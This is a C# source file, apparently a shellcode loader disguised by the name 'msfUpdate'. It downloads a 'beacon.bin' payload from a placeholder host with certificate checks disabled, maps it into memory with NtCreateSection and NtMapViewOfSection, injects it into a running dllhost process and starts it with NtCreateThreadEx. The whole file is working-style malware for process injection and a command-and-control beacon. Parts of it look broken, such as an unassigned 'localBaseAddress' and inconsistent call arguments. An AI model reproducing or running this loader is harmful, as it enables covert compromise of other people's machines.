using structs;
using System;
using System.Diagnostics;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace msfUpdate
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            byte[] shellcode;

            // Get shellcode
            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    shellcode = await client.GetByteArrayAsync("http://ip.address/beacon.bin");
                }
            }

            var hSection = IntPtr.Zero;
            var maxSize = (ulong)shellcode.Length;

            
            r0bit.NtCreateSection(ref hSection,0x10000000,IntPtr.Zero,ref maxSize,0x40,0x08000000,IntPtr.Zero);

          
            r0bit.NtMapViewOfSection(hSection,(IntPtr)(-1),IntPtr.Zero,IntPtr.Zero,IntPtr.Zero,out var _,2,0,0x04);          

            
            Marshal.Copy(shellcode, 0, localBaseAddress, shellcode.Length);

            
            var target = Process.GetProcessesByName("dllhost")[0];

            
            r0bit.NtMapViewOfSection(hSection,target.Handle,out var remoteBaseAddress,IntPtr.Zero,IntPtr.Zero,IntPtr.Zero,out _,2,0,0x20);      

            
            r0bit.NtCreateThreadEx(out _,0x001F0000,IntPtr.Zero,target.Handle,remoteBaseAddress,IntPtr.Zero,false,0,0,0,IntPtr.Zero);
        }
    }
}
